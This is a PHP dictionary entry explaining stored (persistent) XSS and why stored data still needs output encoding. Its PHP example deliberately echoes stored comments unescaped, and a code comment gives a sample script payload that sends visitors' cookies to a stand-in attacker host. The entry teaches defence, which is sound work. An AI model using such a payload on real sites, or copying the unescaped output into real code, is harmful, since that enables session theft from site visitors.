# Stored XSS
Stored XSS, also called persistent XSS, is a variant of ``XSS`` where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request.

Because the payload is persisted, every user who later views the page containing it executes the attacker's script, with no need to click a crafted link or visit a special URL, unlike reflected XSS. This also makes stored XSS more dangerous: a single injection can affect every visitor, including administrators.

Stored XSS commonly slips through when a team treats the database as an implicitly trusted source, sanitizing or validating data only on the way in, and then trusting it enough to skip output encoding on the way out. The database itself provides no protection: encoding must still be applied at the point where the stored value is written into HTML, JavaScript, or another output context.
<script type="application/ld+json">{"@context":["https:\/\/schema.org",{"skos":"http:\/\/www.w3.org\/2004\/02\/skos\/core#"}],"@graph":[{"@type":"DefinedTerm","@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/stored-xss.html","url":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/stored-xss.html","name":"Stored XSS","inDefinedTermSet":{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html#dictionary"},"isPartOf":{"@id":"https:\/\/www.exakat.io\/"},"datePublished":"Wed, 05 Aug 2026 08:12:40 +0000","dateModified":"Wed, 05 Aug 2026 08:12:40 +0000","description":"Stored XSS, also called persistent XSS, is a variant of XSS where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/stored-xss.html"]}],"alternateName":["persistent-xss"],"keywords":["security","vulnerability"],"skos:related":[{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/xss.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/escape-html.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/sanitation.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/htmlpurifier.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/taint.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/database.html"},{"@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/write-context.html"}],"citation":[{"@type":"CreativeWork","name":"Documentation","url":"https:\/\/owasp.org\/www-community\/Types_of_Cross-Site_Scripting"},{"@type":"CreativeWork","name":"Stored XSS","url":"https:\/\/portswigger.net\/web-security\/cross-site-scripting\/stored"}]},{"@type":"DefinedTermSet","@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html#dictionary","name":"The PHP Dictionary","alternateName":"PHP Dictionary","description":"A dictionary of PHP terms, keywords, functions, concepts and jargon.","url":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html","inLanguage":"en","version":"1.1.31","creator":{"@type":"Organization","name":"Exakat","url":"https:\/\/www.exakat.io\/"}},{"@type":"WebSite","@id":"https:\/\/www.exakat.io\/","url":"https:\/\/www.exakat.io\/","name":"Exakat","description":"Smart PHP static analysis","inLanguage":"en-US"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"The PHP Dictionary","item":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index.html"},{"@type":"ListItem","position":2,"name":"Index","item":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/index\/index.html"},{"@type":"ListItem","position":3,"name":"stored-xss"}]}]}</script>
```php
<?php

    // Write path: attacker submits a malicious comment.
    $body = $_POST['comment']; // e.g. '<script>document.location="//evil.example/?c="+document.cookie</script>'
    $pdo->prepare('INSERT INTO comments (body) VALUES (?)')->execute([$body]);

    // Read path, later, for every visitor: raw output re-executes the payload.
    foreach ($pdo->query('SELECT body FROM comments') as $comment) {
        echo $comment['body']; // vulnerable: should be htmlspecialchars($comment['body'])
    }

?>
```

**[Documentation](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)**
## See Also

+ [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

## Related

+ [Cross Site Scripting (XSS)](xss.html)
+ [HTML Escaping](escape-html.html)
+ [Sanitation](sanitation.html)
+ [HTMLPurifier](htmlpurifier.html)
+ [Taint Analysis](taint.html)
+ [Database](database.html)
+ [Write Context](write-context.html)
